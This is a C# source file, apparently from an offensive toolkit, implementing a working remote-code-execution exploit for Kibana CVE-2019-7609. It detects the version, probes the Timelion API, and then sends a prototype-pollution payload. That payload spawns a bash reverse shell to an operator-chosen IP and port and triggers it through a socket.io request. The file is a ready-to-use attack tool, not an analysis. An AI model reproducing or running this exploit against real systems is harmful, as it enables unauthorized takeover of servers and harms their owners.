using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Net;
using System.Threading;
using Newtonsoft.Json;

namespace OelianderUI.Helpers.Exploits
{
    class KibanaExploit
    {
        /// 
        /// Kibana < 6.6.1 Remote Code Execution (CVE-2019-7609)
        /// 


        private static readonly HttpClient client = new HttpClient();

        private static string version = string.Empty;

        internal static readonly string banner = @"
  __  _  _  ___       ___   __   ___  ___      ___   _   ___   __   ___ 
 / _)( )( )(  _) ___ (__ \ /  \ (__ \(__ ) ___(__ ) / ) ( , ) / ,) / __)
( (_  \\//  ) _)(___)/ __/( () )/ __/ (_ \(___)(_ \/ , \/ , \(_  _)\__ \
 \__) (__) (___)     \___) \__/ \___)(___/    (___/\___/\___/  (_) (___/
                Kibana < 6.6.1 RCE
";

        // Method to get Kibana version from the target URL
        public static async Task<string> GetKibanaVersion(string url)
        {
            try
            {
                client.DefaultRequestHeaders.Referrer = new Uri(url);
                client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0");

                var targetUrl = $"{url.TrimEnd('/')}/app/kibana";
                var response = await client.GetAsync(targetUrl);
                var content = await response.Content.ReadAsStringAsync();

                var patterns = new[] { "&quot;version&quot;:&quot;(.*?)&quot;,", "\"version\":\"(.*?)\"," };
                foreach (var pattern in patterns)
                {
                    var match = Regex.Match(content, pattern);
                    if (match.Success)
                    {
                        return match.Groups[1].Value;
                    }
                }
            }
            catch (Exception ex)
            {
                Objects.ShowAlert("ERROR", $"Error getting Kibana version: {ex.Message}", 2);
            }

            return "9.9.9"; // Default fallback version
        }

        // Method to compare versions
        public static bool VersionCompare(string[] standardVersion, string compareVersion)
        {
            try
            {
                var sc1 = new Version(standardVersion[0]);
                var sc2 = new Version(standardVersion[1]);
                var cc = new Version(compareVersion);

                if (sc1.CompareTo(cc) > 0 || (new Version("6.0.0")).CompareTo(cc) <= 0 && sc2.CompareTo(cc) > 0)
                {
                    return true;
                }
            }
            catch (Exception ex)
            {
                Objects.ShowAlert("Version Error", $"Error comparing versions: {ex.Message}", 2);
            }

            return false;
        }

        // Method to verify if the target has the vulnerability
        public static async Task<bool> VerifyVulnerability(string url)
        {
            if (string.IsNullOrEmpty(version) || !VersionCompare(new[] { "5.6.15", "6.6.1" }, version))
            {
                return false;
            }

            client.DefaultRequestHeaders.Referrer = new Uri(url);
            client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0");
            client.DefaultRequestHeaders.Add("kbn-version", version);

            var data = new
            {
                sheet = new[] { ".es(*)" },
                time = new
                {
                    from = "now-1m",
                    to = "now",
                    mode = "quick",
                    interval = "auto",
                    timezone = "Asia/Shanghai"
                }
            };

            var jsonData = JsonConvert.SerializeObject(data);
            var content = new StringContent(jsonData, Encoding.UTF8, "application/json");

            var targetUrl = $"{url.TrimEnd('/')}/api/timelion/run";
            var response = await client.PostAsync(targetUrl, content);

            if (response.IsSuccessStatusCode)
            {
                var responseBody = await response.Content.ReadAsStringAsync();
                if (responseBody.Contains("\"seriesList\""))
                {
                    return true;
                }
            }

            return false;
        }

        // Method to execute reverse shell
        public static async Task<bool> ReverseShell(string target, string ip, string port)
        {
            try
            {
                var randomName = GetRandomString(8);
                client.DefaultRequestHeaders.Add("Content-Type", "application/json;charset=utf-8");
                client.DefaultRequestHeaders.Add("kbn-version", version);
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0");

                var data = new
                {
                    sheet = new[] { $".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"if [ ! -f /tmp/{randomName} ];then touch /tmp/{randomName} && /bin/bash -c \\'/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1\\'; fi\");process.exit()//')" },
                    time = new
                    {
                        from = "now-15m",
                        to = "now",
                        mode = "quick",
                        interval = "10s",
                        timezone = "Asia/Shanghai"
                    }
                };

                var jsonData = JsonConvert.SerializeObject(data);
                var content = new StringContent(jsonData, Encoding.UTF8, "application/json");

                var url = $"{target}/api/timelion/run";
                var response = await client.PostAsync(url, content);

                if (response.IsSuccessStatusCode)
                {
                    var triggerUrl = $"{target}/socket.io/?EIO=3&transport=polling&t=MtjhZoM";
                    var triggerRequest = new HttpRequestMessage(HttpMethod.Get, triggerUrl)
                    {
                        Headers =
                    {
                        { "kbn-xsrf", "professionally-crafted-string-of-text" }
                    }
                    };

                    var triggerResponse = await client.SendAsync(triggerRequest);
                    if (triggerResponse.IsSuccessStatusCode)
                    {
                        // Allow for some time for reverse shell to establish
                        Thread.Sleep(5000);
                        return true;
                    }
                }
            }
            catch (Exception ex)
            {
                Objects.ShowAlert("Reverse Shell", $"Error executing reverse shell: {ex.Message}", 2);
            }

            return false;
        }

        // Helper method to generate a random string
        public static string GetRandomString(int length)
        {
            var random = new Random();
            var chars = "qwertyuiopasdfghjkl";
            var result = new StringBuilder();
            for (int i = 0; i < length; i++)
            {
                result.Append(chars[random.Next(chars.Length)]);
            }
            return result.ToString();
        }

        // Main method to handle command line args and execute the exploit
        public static async Task ScanForKibanaRCE(string target, string revShellHost = "127.0.0.1", string revShellPort = "8888", bool isReverseShell = false)
        {
            try
            {
                // Fetch Kibana version
                version = await GetKibanaVersion(target);
                // Verify vulnerability
                bool result = await VerifyVulnerability(target);
                if (result)
                {
                    Objects.ShowAlert("Vulns Found", $"[+] {target} may have CVE-2019-7609 (Kibana < 6.6.1 RCE) vulnerability", 1);
                    if (isReverseShell)
                    {
                        result = await ReverseShell(target, revShellHost, revShellPort);
                        if (result)
                        {
                            Objects.ShowAlert("Reverse Shell", $"[+] Reverse shell successfully established! Please check session on: {revShellHost}:{revShellPort}", 0);
                        }
                        else
                        {
                            Objects.ShowAlert("Reverse Shell", "[-] Unable to establish reverse shell.", 2);
                        }
                    }
                }
                else
                {
                    Objects.ShowAlert("No Vulns", $"[-] {target} does not have CVE-2019-7609 vulnerability.", 1);
                }
            }
            catch (Exception ex)
            {
                Objects.ShowAlert("[-] Exploit failed!", ex.Message, 2);
            }
        }
    }
}
